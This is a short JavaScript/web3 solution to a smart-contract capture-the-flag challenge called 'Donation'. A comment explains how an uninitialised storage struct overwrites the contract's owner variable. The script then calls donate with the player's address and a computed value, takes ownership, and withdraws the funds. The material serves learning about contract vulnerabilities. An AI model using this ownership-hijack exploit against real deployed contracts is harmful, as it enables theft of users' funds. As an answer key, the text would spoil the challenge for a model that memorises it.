/*
	Same as the previous 'Mapping' challenge, the 'owner' variable can be overwritten by the structs stored in the 'Donation' array. It's then possible to send the player's address as the 'ethersAmount'
	and compute the 'msg.value' accordingly to pass the 'require' statement. Funds can then be withdrawn as player as become the owner of the contract.
*/
abi_donation = [{"constant":false,"inputs":[],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"etherAmount","type":"uint256"}],"name":"donate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"uint256"}],"name":"donations","outputs":[{"name":"timestamp","type":"uint256"},{"name":"etherAmount","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":true,"stateMutability":"payable","type":"constructor"}]
contract_donation = new web3.eth.Contract(abi_donation, "0xE1B440E819504D55ce4CDB529A2C43b7bf5712C3")

await contract_donation.methods.donate(String(BigInt(player))).send({"from":player, "value":String(BigInt(player)/BigInt(10**36))})
await contract_donation.methods.withdraw().send({"from":player})